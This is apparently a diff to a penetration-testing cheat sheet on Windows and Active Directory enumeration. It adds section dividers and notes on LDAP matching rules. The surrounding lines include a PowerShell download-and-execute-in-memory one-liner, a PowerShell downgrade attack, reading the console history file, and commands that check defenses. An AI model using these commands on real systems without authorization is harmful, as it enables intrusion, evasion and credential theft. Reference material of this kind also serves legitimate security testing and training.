@@ -1539,8 +1539,9 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 ```
 ##### Living Of The Land
 ```
+____________________________________________
 (Basic Enumeration Commands)
-
+____________________________________________
 # Prints the PC's Name
 hostname
 
@@ -1564,9 +1565,9 @@ echo %USERDOMAIN%
 
 # Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
 echo %logonserver%
-
+____________________________________________
 (Harnessing PowerShell)
-
+____________________________________________
 # Lists available modules loaded for use.
 Get-Module
 
@@ -1584,17 +1585,17 @@ Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_his
 
 # This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
 powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
-
+____________________________________________
 (Downgrade Powershell)
-
+____________________________________________
 # Check your current PowerShell version and host information.
 Get-host
 
 # Revert your PowerShell session to version 2.0 (Downgrade Attack).
 powershell.exe -version 2
-
+____________________________________________
 (Checking Defenses)
-
+____________________________________________
 # Display the Windows Firewall status across all profiles.
 netsh advfirewall show allprofiles
 
@@ -1611,9 +1612,9 @@ Get-MpComputerStatus
 
 # This command displays a list of all currently active login (sessions) on the Windows system.
 qwinsta
-
+____________________________________________
 (Network Information)
-
+____________________________________________
 # Lists all known hosts stored in the arp table.
 arp -a
 
@@ -1625,10 +1626,10 @@ route print
 
 # 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
 netsh advfirewall show allprofiles
-
+____________________________________________
 (Windows Management Instrumentation (WMI))
 (https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)
-
+____________________________________________
 # Prints the patch level and description of the Hotfixes applied
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 
@@ -1649,9 +1650,9 @@ wmic group list /format:list
 
 # Dumps information about any system accounts that are being used as service accounts.
 wmic sysaccount list /format:list
-
+____________________________________________
 (Net Commands)
-
+____________________________________________
 # Display domain password & lockout policy
 net accounts /domain
 
@@ -1681,6 +1682,7 @@ net localgroup
 
 # Check current shares
 net share
+
 # List members of the local Administrators group
 net localgroup administrators
 
@@ -1692,9 +1694,9 @@ net view \\<computername> /all
 
 # Mount a network share to a local drive letter
 net use x: \\<computername>\<sharename>
-
+____________________________________________
 (Dsquery Commands)
-
+____________________________________________
 # List all users in the current domain (DN format)
 dsquery user
 
@@ -1715,6 +1717,20 @@ dsquery user -inactive 4
 
 # Find disabled user accounts
 dsquery user -disabled
+____________________________________________
+(LDAP OID Matching Rules)
+____________________________________________
+# 1.2.840.113556.1.4.803 (LDAP_MATCHING_RULE_BIT_AND)
+# Meaning: Bitwise AND. Matches if the bit is EXACTLY set.
+# Use Case: Find accounts with a specific UAC flag (e.g., Only Disabled accounts).
+
+# 1.2.840.113556.1.4.804 (LDAP_MATCHING_RULE_BIT_OR)
+# Meaning: Bitwise OR. Matches if ANY bit in the mask is set.
+# Use Case: Find accounts that have at least one of several flags set.
+
+# 1.2.840.113556.1.4.1941 (LDAP_MATCHING_RULE_IN_CHAIN)
+# Meaning: Recursive lookups. Walks the lineage of an object.
+# Use Case: Find all members of a group, including those in Nested Groups.
 ```
 ##### Kerberoasting
 ```
